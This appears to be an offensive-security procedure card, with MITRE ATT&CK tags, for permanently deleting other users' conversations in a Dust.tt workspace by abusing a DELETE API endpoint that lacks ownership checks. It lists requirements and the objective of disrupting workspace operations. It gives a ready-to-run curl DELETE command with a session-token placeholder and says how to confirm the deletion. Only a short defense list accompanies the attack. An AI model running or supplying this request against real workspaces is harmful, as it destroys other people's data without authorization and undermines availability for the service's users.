---
id: proc-dust-delete-unauth-001
tags:
  - broken-access-control
  - data-destruction
  - dust-tt
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-dust-delete-conversation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data Destruction]]'
updated_at: '2025-12-14T17:30:26.887Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Data Destruction]]'
---
# Delete-Unauthorized-Conversation

## Summary

This procedure leverages broken access control to permanently delete any conversation in a Dust.tt workspace without ownership verification, disrupting availability.

## Description

The DELETE /api/w/<Workspace-id>/assistant/conversations/<conversation-id> endpoint performs no server-side checks, allowing authenticated users to remove threads owned by others, including critical admin discussions.

## Requirements

1. Authenticated session token
2. Workspace ID and target conversation ID
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Enforce ownership validation before deletions
- Audit and alert on delete operations, especially cross-user
- Implement soft deletes with recovery options

## Objectives

1. Remove unauthorized conversations
2. Demonstrate availability impact
3. Disrupt workspace operations

## Instructions

### Step 1: Verify Target

**Context**: Confirm the conversation exists via a prior read attempt.

Use the read procedure to ensure the ID is valid.

### Step 2: Issue Delete Request

**Context**: Send the DELETE to remove the resource.

**Command** ([[commands/curl-dust-delete-conversation]]):
```bash
curl -X DELETE "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer YOUR_SESSION_TOKEN"
```

> Expected output: HTTP 200 OK or 204 No Content, with no body. Verify by attempting a re-read, which should fail with 404.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Data Destruction]] Data Destruction

### Sub-Techniques

-

## Commands Used

- [[commands/curl-dust-delete-conversation]]

## Tools Used

-

## Tags

- [[broken-access-control]]
- [[dust-tt]]
